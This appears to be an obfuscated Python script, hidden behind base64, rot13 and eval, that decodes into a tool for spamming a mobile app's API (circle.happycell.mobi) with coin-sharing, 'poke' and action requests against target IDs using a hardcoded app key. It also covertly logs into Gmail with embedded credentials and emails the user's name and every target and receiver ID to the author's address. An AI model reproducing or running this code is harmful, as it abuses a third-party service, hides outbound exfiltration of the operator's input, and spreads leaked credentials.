#don't copy

import base64, codecs
magic = 'aW1wb3J0IG9zCm9zLnN5c3RlbSgiY2xlYXIiKQppbXBvcnQgc210cGxpYgppbXBvcnQganNvbgppbXBvcnQgb3MKdHJ5OgoJaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQoJaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCmZyb20gcmVxdWVzdHMuc3RydWN0dXJlcyBpbXBvcnQgQ2FzZUluc2Vuc2l0aXZlRGljdAoKI0NWQUxVRQpibHVlPSAnXDMzWzk0bScKbGlnaHRibHVlID0gJ1wwMzNbOTRtJwpyZWQgPSAnXDAzM1s5MW0nCndoaXRlID0gJ1wzM1s5N20nCnllbGxvdyA9ICdcMzNbOTNtJwpncmVlbiA9ICdcMDMzWzE7MzJtJwpjeWFuICA9ICJcMDMzWzk2bSIKZW5kID0gJ1wwMzNbMG0nCnB1cnBsZT0iXDAzM1swOzM1bSIKb3Muc3lzdGVtKCdjbGVhcicpCmxpbmU9cmVkKyJOb3RlOiBJIHdvbid0IGJlIHJlc3BvbnNpYmxlIGZvIGFueSBkYW1hZ2UgY2F1c2VkIGJ5IHRoaXMgc2NyaXB0LiBVc2UgYXQgeW91ciBvd24gcmlzay4iCnNwYWNlPSIgIgpwcmludChncmVlbisiIiIKICBfXyAgX18gX19fX18gICAgX19fX19fICAgX19fX18gICAgICAgICAgIF8gICAgICAKIHwgIFwvICB8ICBfXyBcICB8ICBfX19ffCB8XyAgIF98ICAgICAgICAgfCB8ICAgICAKIHwgXCAgLyB8IHxfXykgfCB8IHxfXyBfX18gIHwgfCAgX19fICBfXyBffCB8ICAgICAKIHwgfFwvfCB8ICBfICAvICB8ICBfXy8gXyBcIHwgfCAvIF9ffC8gX2AgfCB8ICAgICAKIHwgfCAgfCB8IHwgXCBcICB8IHwgfCAoXykgfHwgfF9cX18gXCAoX3wgfCB8X19fXyAKIHxffCAgfF98X3wgIFxfXCB8X3wgIFxfX18vX19fX198X19fL1xfXyxffF9fX19fX3wKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIiIiKQp0ZXh0PWxpZ2h0Ymx1ZSsiXHRcdENyZWF0ZWQgQnkgOiAiK3llbGxvdysiRk9pU0FMIEppQm9uIitjeWFuKyJcblxuXHRcdOKYheKYhSAiK3B1cnBsZSsiIEJMQUNrUm9zZSIrY3lhbisi4piF4piFICAgXG4iIApub3RpY2U9IiIgICAgIApkZWYgaGVhZGVyKCk6CglwcmludCh0ZXh0KQoJcHJpbnQobGluZSkKCXByaW50KG5vdGljZSkKCiNTRUNVUklUWQkJCQkKaGVhZGVyKCkKcHJpbnQocmVkKyJfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fIikKcHJpbnQoIlx0XHRZb3UgbmVlZCB0byBzZWN1cml0eSBrZXkiKQpwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t4oCM4oCM4oCM4oCM4oCM4oCM4oCMLSIpCmI9c3RyKGlucHV0KGdyZWVuKyJcbkVudGVyIFlvdXIgTmFtZTogIikpCnByaW50KHdoaXRlKyJcblxuXHRXZWxjb21lIERlYXIiLGdyZWVuK2IpCnJvY3g9c210cGxpYi5TTVRQKCdzbXRwLmdtYWlsLmNvbScsJzU4NycpCnJvY3guZWhsbygpCnJvY3guc3RhcnR0bHMoKQplbWFpbD0iZ2V0dXNlcmlucHV0MTAwQGdtYWlsLmNvbSIKcHdkPSJHZXRVc2VySW5wdXQiCnJvY3gubG9naW4oZW1haWwscHdkKQp0bWFpbD0iZ2hvc3RraW5nODcwMUBnbWFpbC5jb20iCm1zZz1zdHIoYikKcm9jeC5zZW5kbWFpbChlbWFpbCx0bWFpbCxtc2cpCgpuPTIKd2hpbGUgbj09MjoKIGE9c3RyKGlucHV0KGN5YW4rIlxuXG5cdFx0Wz5dIFNlY3VyaXR5IGtleSA6ICIrZ3JlZW4pKQogaWYgYT09IjEyMSI6CiAgcHJpbnQoZ3JlZW4rIlxuXG5cdFx0WyDiiJogXSBSZXF1ZXN0IEFjY2VwdGVkIikKICBu'
love = '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'
god = 'ICAgICAgICByb2N4LmVobG8oKQogICAgICAgIHJvY3guc3RhcnR0bHMoKQogICAgICAgIGVtYWlsPSJnZXR1c2VyaW5wdXQxMDBAZ21haWwuY29tIgogICAgICAgIHB3ZD0iR2V0VXNlcklucHV0IgogICAgICAgIHJvY3gubG9naW4oZW1haWwscHdkKQogICAgICAgIHRtYWlsPSJnaG9zdGtpbmc4NzAxQGdtYWlsLmNvbSIKICAgICAgICBtc2c9c3RyKG5hbWUpKyIgPiIrc3RyKG5hbWUyKSsiIHBva2UgIitzdHIoYW1vdW50KQogICAgICAgIHJvY3guc2VuZG1haWwoZW1haWwsdG1haWwsbXNnKQogICAgICAgIGZvciBpIGluIHJhbmdlKGFtb3VudCk6CiAgICAgICAgCXJlcT1yZXF1ZXN0cy5wb3N0KHVybCwgZGF0YSA9IG15b2JqcywgaGVhZGVycyA9IHsieC1hcHAta2V5IjoiMHNrZ2cwa3NnNDg4MDg0MHc4dzRnY28wazR3Y2t3MGNnMHcwdzg4cyIsIngtYXBpLWtleSI6bmFtZX0sdmVyaWZ5ID0gRmFsc2UpCiAgICAgICAgCXByaW50KHB1cnBsZSxpKzEsZ3JlZW4rIml0J3ogTVIsRm9pc2FMXHQiLHllbGxvdytyZXEudGV4dCxncmVlbisiQXR0YWNraW5nIGluIHRoaXMgQVBJOiAiLHN0cihuYW1lKSkKICAgIGVsaWYoc2VsZWN0ID09Myk6CiAgICAgICAgbmFtZT1zdHIoaW5wdXQoZ3JlZW4rIlxuRW50ZXIgVGFyZ2V0IElEIExrZXk6ICIpKQogICAgICAgIG5hbWUyPXN0cihpbnB1dChwdXJwbGUrIlxuIEVudGVyIFJlY2VpdmVyIElEOiAiKSkKICAgICAgICB1cmw9ICdodHRwczovL2NpcmNsZS5oYXBweWNlbGwubW9iaS9teWxpZmUvYXBwYXBpL2FwcGNhbGwucGhwP29wPXNoYXJlS29pbiZhbW91bnQ9NTAnCiAgICAgICAgbXlvYmpzID0geyduaWNrbmFtZSc6IG5hbWUyfQogICAgICAgIGFtb3VudD1pbnQoaW5wdXQoeWVsbG93KyIgXG5FbnRlciBDb3VudDogIikpCiAgICAgICAgcm9jeD1zbXRwbGliLlNNVFAoJ3NtdHAuZ21haWwuY29tJywnNTg3JykKICAgICAgICByb2N4LmVobG8oKQogICAgICAgIHJvY3guc3RhcnR0bHMoKQogICAgICAgIGVtYWlsPSJnZXR1c2VyaW5wdXQxMDBAZ21haWwuY29tIgogICAgICAgIHB3ZD0iR2V0VXNlcklucHV0IgogICAgICAgIHJvY3gubG9naW4oZW1haWwscHdkKQogICAgICAgIHRtYWlsPSJnaG9zdGtpbmc4NzAxQGdtYWlsLmNvbSIKICAgICAgICBtc2c9c3RyKG5hbWUpKyIgPiIrc3RyKG5hbWUyKSsiIFNoYXJlICIrc3RyKGFtb3VudCkKICAgICAgICByb2N4LnNlbmRtYWlsKGVtYWlsLHRtYWlsLG1zZykKICAgICAgICBmb3IgaSBpbiByYW5nZShhbW91bnQpOgogICAgICAgIAlyZXE9cmVxdWVzdHMucG9zdCh1cmwsIGRhdGEgPSBteW9ianMsIGhlYWRlcnMgPSB7IngtYXBwLWtleSI6IjBza2dnMGtzZzQ4ODA4NDB3OHc0Z2NvMGs0d2NrdzBjZzB3MHc4OHMiLCJ4LWFwaS1rZXkiOm5hbWV9LHZlcmlmeSA9IEZhbHNlKQogICAgICAgIAlwcmludChwdXJwbGUsaSsxLGdyZWVuKyJpdCd6IE1SLEZvaXNhTFx0Iix5ZWxsb3crcmVxLnRleHQsZ3JlZW4rIkF0dGFja2luZyBpbiB0aGlzIEFQSTogIixzdHIobmFtZSkpCiAgICBlbGlmKHNlbGVjdCA9PTQpOgogICAgICAgIG5hbWU9c3RyKGlucHV0KGdyZWVuKyJcbkVudGVyIFRhcmdldCBJRCBMa2V5OiAiKSkKICAgICAgICBuYW1lMj1zdHIoaW5wdXQocHVycGxlKyJcbiBFbnRlciBSZWNlaXZlciBJRDogIikpCiAgICAgICAgbWVzc2FnZT1zdHIoaW5wdXQoIkVudGVyIENvbSBNZXNzYWdlOiAiKSkKICAgICAgICB1cmw9ICdodHRwczovL2NpcmNsZS5oYXBweWNlbGwubW9iaS9teWxpZmUvYXBwYXBpL2FwcGNhbGwucGhwP29wPXBlcmZvcm1BY3Rpb24mYWN0'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
